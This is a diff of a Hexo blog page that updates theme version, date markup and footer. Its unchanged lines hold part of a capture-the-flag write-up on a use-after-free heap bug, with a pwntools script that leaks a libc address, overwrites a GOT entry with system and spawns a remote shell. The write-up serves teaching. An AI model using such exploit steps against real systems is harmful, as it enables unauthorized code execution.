@@ -23,7 +23,7 @@
     <script id="hexo-configurations">
     let KEEP = window.KEEP || {};
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"300px","content_max_width":"1200px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"300px","content_max_width":"1200px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
   </script>
 <meta name="generator" content="Hexo 5.4.0"></head>
@@ -183,7 +183,9 @@
                     <div class="meta-info">
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2020-08-14 20:13:35
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2020-08-14 20:13:35</span>
+        <span class="mobile">2020-08-14 20:13</span>
     </span>
     
         <span class="article-categories article-meta-item">
@@ -326,7 +328,7 @@ Or write script (use new method – <code>sendlineafter</code>):<figure class="h
 <li>Add another one (prevent from chunck merging)<br><img src="/imghost/apcaw/uaf6.svg" alt="Step 2"></li>
 <li>Edit commodity 0’s <code>description</code> to release it and allocate new space.<br>If commodity 1 and description 1 do not exist, it will just expand old description 0 instead of allocate a new memory.<br><img src="/imghost/apcaw/uaf7.svg" alt="Step 3"></li>
 <li>Add one more commodity (commodity 2).<br>Now if we edit description 0, we are editing commodity 2.<br><img src="/imghost/apcaw/uaf8.svg" alt="Step 4"></li>
-<li>Edit description 0 to overwrite <code>description</code> pointer in commodity 2 as some function’s <code>GOT</code> item, and use <code>list commodities</code> to leak address. </li>
+<li>Edit description 0 to overwrite <code>description</code> pointer in commodity 2 as some function’s <code>GOT</code> item, and use <code>list commodities</code> to leak address.</li>
 </ol>
 <p>Note: Pay attention to chunck size. The description 0 we released should be <code>unsorted bin</code> instead of <code>fastbin</code>.<br>Because in <code>fastbin</code> it only allocates chunck with same size, while in <code>Change the description of a commodity</code> the last byte will be set <code>0</code>. In commodity the last part is <code>char *description</code> and it is where I write function’s <code>GOT</code> item, so it cannot be <code>0</code>. The chuncks in <code>fastbin</code> are between <code>0x20</code> and <code>0x80</code> bytes, so description 0 should be larger.</p>
 <h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><p>Hijack <code>GOT</code> item of <code>atoi</code>:</p>
@@ -337,6 +339,32 @@ Or write script (use new method – <code>sendlineafter</code>):<figure class="h
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p =remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;31614&#x27;</span>)</span><br><span class="line">got = <span class="number">0x804b038</span> <span class="comment"># `got` item of `__libc_start_main`</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,price,descrip_size,description</span>):</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">name</span>):</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_price</span>(<span class="params">name,price</span>):</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_des</span>(<span class="params">name,descrip_size,description</span>):</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list</span>():</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;A&quot;</span>,<span class="number">0x10</span>,<span class="number">0x100</span>,<span class="string">&quot;AAAA&quot;</span>)    </span><br><span class="line">change_des(<span class="string">&quot;A&quot;</span>,<span class="number">8</span>,<span class="string">&quot;C&quot;</span>*<span class="number">7</span>+<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;B&quot;</span>,<span class="number">0x10</span>,<span class="number">0x100</span>,<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;B&quot;</span>*<span class="number">12</span>+ p32(<span class="number">0x21</span>) + p32(<span class="number">0x42</span>) + <span class="string">&quot;B&quot;</span>*<span class="number">12</span> + p32(<span class="number">0x00</span>) +p32(<span class="number">0x100</span>) +p32(got)</span><br><span class="line">change_des(<span class="string">&#x27;A&#x27;</span>,<span class="number">100</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;B: price.0, des.&quot;</span>)</span><br><span class="line">addr = p.recvn(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span><span class="string">&quot;addr:&quot;</span>,<span class="built_in">hex</span>(u32(addr))</span><br><span class="line">libc = u32(addr) - <span class="number">0x18540</span><span class="comment">#0x49020</span></span><br><span class="line">system_addr = libc + <span class="number">0x3a940</span></span><br><span class="line"><span class="built_in">print</span><span class="string">&quot;libc:&quot;</span>,<span class="built_in">hex</span>(libc)</span><br><span class="line"><span class="built_in">print</span><span class="string">&quot;system_addr:&quot;</span>,<span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line">change_des(<span class="string">&quot;B&quot;</span>,<span class="number">0x100</span>,p32(system_addr)*<span class="number">5</span>)<span class="comment">#+&#x27;\n&#x27;</span></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
         </div>
 
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/pwn/">#pwn</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/linux/">#linux</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/ctf/">#ctf</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/heap/">#heap</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/uaf/">#uaf</a>&nbsp;
+                    </li>
+                
+            </ul>
         
 
         
@@ -392,14 +420,16 @@ Or write script (use new method – <code>sendlineafter</code>):<figure class="h
         <div class="copyright-info info-item">
             &copy;
             
-              <span>2018</span>&nbsp;-&nbsp;
+              <span>2020</span>
+              -
             
             2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">TyeYeah</a>
         </div>
         
         <div class="theme-info info-item">
-            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
         </div>
+        
         
     </div>
 </footer>
@@ -409,58 +439,19 @@ Or write script (use new method – <code>sendlineafter</code>):<figure class="h
 
     
         <div class="post-tools">
-            $li-border-radius = 5px;
-$li-margin-bottom = 12px;
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
 
-.post-tools-container {
-
-  .tools-list {
-
-    li {
-      cursor: pointer;
-      width: $post-tool-button-width;
-      height: $post-tool-button-width;
-      border-radius: 50%;
-      font-size: 1.2rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: $li-margin-bottom;
-      background: var(--background-color);
-      color: var(--default-text-color);
-
-      i {
-        color: var(--default-text-color);
-      }
-
-      &:hover {
-        background: var(--primary-color);
-        color: var(--background-color);
-
-        i {
-          color: var(--background-color);
-        }
-      }
-
-
-      &:last-child {
-        margin-bottom: 0;
-      }
-
-
-      hover-style(true, 1.06, 1.06);
-
-      &.page-aside-toggle {
-        display: none;
-
-        +keep-tablet() {
-          display: none !important;
-        }
-      }
-    }
-  }
-
-}
+        <!-- go comment -->
+        
+    </ul>
+</div>
 
         </div>
     
@@ -519,43 +510,9 @@ $li-margin-bottom = 12px;
         </aside>
     
 
-    .image-viewer-container {
-  position: fixed;
-  left: 0;
-  top: 0;
-  width: 100%;
-  height: 100%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: rgba(0, 0, 0, 0);
-  visibility: hidden;
-  z-index: $z-index-8;
-  padding: 6%;
-  box-sizing: border-box;
-  transition-t("visibility, background", "0, 0", "0.3, 0.3", "ease, ease");
-
-  &.active {
-    background: rgba(0, 0, 0, 0.5);
-    visibility: visible;
-
-    img {
-      cursor: zoom-out;
-      transform: scale(1);
-      padding: 2px;
-      background: var(--background-color);
-    }
-  }
-
-  img {
-    max-width: 100%;
-    max-height: 100%;
-    transform: scale(0);
-    transition-t("transform", "0", "0.3", "ease");
-  }
-}
-
-
+    <div class="image-viewer-container">
+    <img src="">
+</div>
 
 
     
